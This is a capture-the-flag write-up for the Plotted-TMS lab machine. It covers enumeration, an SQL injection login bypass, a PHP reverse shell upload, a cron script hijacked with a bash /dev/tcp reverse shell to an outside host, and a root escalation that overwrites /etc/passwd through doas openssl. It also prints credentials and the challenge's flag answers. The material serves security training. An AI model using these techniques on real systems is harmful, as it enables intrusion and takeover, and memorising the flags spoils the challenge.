# Plotted-TMS

Happy Hunting!
Tip: Enumeration is key!

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

---

## Dirsearch

```bash
dirsearch -u http://plotted.thm -e * -t 50
```

```
301 -  /admin   →  http://plotted.thm/admin/
200 -  /admin/
200 -  /passwd
```

Going to those paths, we get a password and an id\_rsa.

**Password (base64):**

```
bm90IHRoaXMgZWFzeSA6RA==
```

**id\_rsa (base64):**

```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIH
RvIGVudW1lcmF0aW9uIDpE
```

Decoding both gives:

```
Trust me it is not this easy..now get back to enumeration :D

not this easy :D
```

<img width="1857" height="980" alt="Screenshot From 2025-09-04 21-48-34" src="https://github.com/user-attachments/assets/6f5d0cc4-ec3e-4f96-b1df-f1c08b2dbe42" />

---

## SMB Enumeration

Nothing useful on port 80, so I enumerated port 445.
I found:

```
http://10.201.44.185:445/management/admin/login.php
```

On the login page, testing SQL injection with:

```
' OR 1=1 --
```

It worked.

<img width="1857" height="980" alt="Screenshot From 2025-09-04 21-52-20" src="https://github.com/user-attachments/assets/c526eb73-c320-47d0-b72a-34bd73637554" />

---

## Web Shell Upload

Inside **Driver List**, I could upload files. I uploaded a PHP reverse shell:

<img width="1857" height="980" alt="Screenshot From 2025-09-04 21-57-36" src="https://github.com/user-attachments/assets/94171b90-59a2-4f3c-9ade-02f48c9a465f" />

Reverse shell source:
[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Set up a listener, clicked the eye button, and caught a reverse shell.

---

## Cron & Backup Script

Looking around:

```bash
www-data@plotted:/var/www/scripts$ cat backup.sh 
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

Checking crontab:

```bash
cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * *	plot_admin /var/www/scripts/backup.sh
```

So it runs every minute.

---

## Database Credentials

In `initialize.php` I found:

```php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0');
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
```

I logged into MySQL:

```bash
mysql -u tms_user -p
# Password: Password@123
```

Listed databases:

```sql
SHOW DATABASES;
```

```
Database
information_schema
tms_db
```

Used the database:

```sql
USE tms_db;
SHOW TABLES;
```

```
users
```

Dumped the users table:

```sql
SELECT * FROM users;
```

```
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 14d147dc0ba2fed434e7fd176dc87fdc | uploads/1624240500_avatar.png | NULL       |    1 | 2021-01-20 14:02:37 | 2022-01-27 11:10:25 |
|  9 | Plotted      | User     | puser    | 1254737c076cf867dc53d60a0364f38e | uploads/1629336240_avatar.jpg | NULL       |    2 | 2021-08-19 09:24:25 | 2021-10-28 07:33:02 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
```

Hash cracked:

```
1254737c076cf867dc53d60a0364f38e → jsmith123
```

---

## Exploiting Cron

Logging in with cracked credentials didn’t work. Instead, I exploited the writable `backup.sh`.

```bash
www-data@plotted:/var/www/scripts$ nano shell.sh
bash -c 'exec bash -i &>/dev/tcp/10.201.98.101/4444 <&1'

mv backup.sh old
mv shell.sh backup.sh
chmod +x backup.sh
```

On my machine:

```bash
nc -lvnp 4444
```

After a minute, the cronjob triggered and I got a shell as `plot_admin`.

First flag:

```
77927510d5edacea1f9e86602f1fbadb
```

---

## Privilege Escalation with Doas

Checking for SUID:

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

Found:

```
/usr/bin/doas
```

Checked config:

```bash
cat /etc/doas.conf
```

```
permit nopass plot_admin as root cmd openssl
```

So I could run `openssl` as root. From GTFOBins:

```bash
LFILE=/etc/passwd
echo root::0:0:root:/root:/bin/bash | doas -u root openssl enc -out $LFILE
```

Then switched:

```bash
su
```

Got root shell.

Root flag:

```
53f85e2da3e874426fa059040a9bdcab
```

---

## Flags

> Q1: User flag
> A1: 77927510d5edacea1f9e86602f1fbadb

> Q2: Root flag
> A2: 53f85e2da3e874426fa059040a9bdcab
